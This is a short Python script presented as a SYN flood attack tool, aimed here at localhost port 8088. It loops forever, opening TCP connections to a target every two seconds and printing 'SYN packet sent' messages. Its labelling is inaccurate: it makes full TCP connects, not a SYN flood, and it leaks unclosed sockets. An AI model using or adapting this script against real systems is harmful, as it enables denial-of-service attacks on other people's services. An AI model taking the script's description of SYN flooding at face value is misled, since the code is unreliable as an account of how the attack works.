import socket
import time

def syn_flood_attack(target_ip, target_port):
    attempt = 0
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))  
            attempt += 1
            print(f"[OK] SYN packet {attempt} sent to {target_ip}:{target_port}")
        except:
            print(f"[FAIL] Connection attempt {attempt} failed.")
        time.sleep(2)
        
syn_flood_attack('localhost', 8088)
